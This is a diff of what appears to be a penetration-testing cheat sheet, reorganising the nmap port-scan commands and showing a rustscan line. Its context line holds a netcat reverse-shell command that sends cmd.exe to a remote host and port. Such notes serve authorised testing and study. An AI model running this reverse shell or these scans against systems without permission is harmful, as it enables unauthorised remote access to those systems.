@@ -63,10 +63,14 @@ nc.exe 192.168.100.113 4444 –e cmd.exe
 
 ### Port Scan
 ```bash
-#namp
-nmap -sS -Pn -n -A x.x.x.x
-sudo nmap -sC -sV -oN websrv1/nmap 192.168.50.244
-sudo nmap -sU -p- --max-retries 0 --min-rate 500 x.x.x.x       #UDP scan
+#quick scan
+sudo nmap -T4 -F x.x.x.x  
+#fullscan
+sudo nmap -sS -Pn -A x.x.x.x
+#udp scan
+sudo nmap -sU -p- --max-retries 0 --min-rate 500 x.x.x.x  
+#output to file
+sudo nmap -sC -sV x.x.x.x -oN scanresult.txt
 
 #rustscan
 rustscan -a IP --ulimit 5000
